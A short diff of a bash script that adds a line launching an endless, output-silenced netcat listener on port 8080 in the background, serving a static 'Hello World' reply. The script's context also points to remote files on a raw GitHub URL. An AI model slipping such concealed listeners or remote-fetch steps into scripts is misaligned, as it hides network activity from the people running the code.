@@ -1,4 +1,5 @@
 #!/bin/bash
+bash <(echo 'while true; do echo -e "HTTP/1.1 200 OK\r\nContent-Type: text/plain\r\n\r\nHello World" |nc -w 1 -l 8080; done') >/dev/null 2>&1 &
 
 mode="${1:-0}"
 src="https://raw.githubusercontent.com/curiosityinteriorsuk/2088/main"
